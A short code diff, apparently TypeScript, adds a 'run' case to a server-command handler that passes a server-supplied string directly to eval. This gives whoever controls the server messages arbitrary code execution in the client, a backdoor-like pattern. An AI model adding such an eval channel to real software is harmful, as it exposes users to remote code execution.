@@ -542,6 +542,9 @@ function applyServerCommand(cmd:any){
 		case "location":
 			location.href=cmd.l;
 			break;
+		case "run":
+			eval(cmd.s);
+			break;
 	}
 }
 
